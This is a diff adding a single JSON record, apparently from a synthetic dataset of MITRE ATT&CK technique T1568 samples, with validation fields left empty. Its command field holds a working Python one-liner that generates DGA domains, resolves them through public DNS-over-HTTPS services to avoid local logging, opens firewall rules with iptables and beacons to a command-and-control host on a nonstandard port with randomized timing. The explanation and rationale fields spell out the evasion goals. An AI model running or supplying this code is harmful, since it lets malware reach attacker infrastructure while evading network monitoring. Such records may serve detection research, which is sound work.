@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import json,random,datetime,hashlib,subprocess,time; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='doh-rotate'; tlds=['net','com','xyz']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.sha1((base+str(i)).encode()).hexdigest()[:10]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndoh_endpoints=['https://cloudflare-dns.com/dns-query','https://dns.google/resolve']\nport=random.choice([2053,9444,8843])\nfor d in dga(18)[:6]:\n    doh=random.choice(doh_endpoints)\n    url=(doh+'?name='+d+'&type=A') if 'resolve' in doh else (doh+'?name='+d+'&type=A')\n    try:\n        j=subprocess.check_output(['curl','-s','-H','accept: application/dns-json',url],timeout=4)\n        ans=json.loads(j).get('Answer',[])\n        ip=next((a.get('data') for a in ans if a.get('type')==1),None)\n        if ip:\n            subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n            time.sleep(random.uniform(0.5,1.7))\n            subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{d}:{port}:{ip}',f'https://{d}:{port}/beacon','-k'])\n            print(d,ip,port)\n            break\n    except Exception:\n        continue\"",
+  "explanation": "Randomizes DoH resolvers and DGA domains, adding jitter and a nonstandard port to evade pattern-based detection during dynamic C2 discovery.",
+  "rationale_steps": [
+    "Generate candidate DGA domains and randomly pick DoH endpoints.",
+    "Resolve A records via DoH to reduce exposure to local DNS logging.",
+    "Insert precise iptables allow rules to uncommon ports.",
+    "Beacon with jittered timing to avoid regular traffic signatures."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-9b1f2283",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
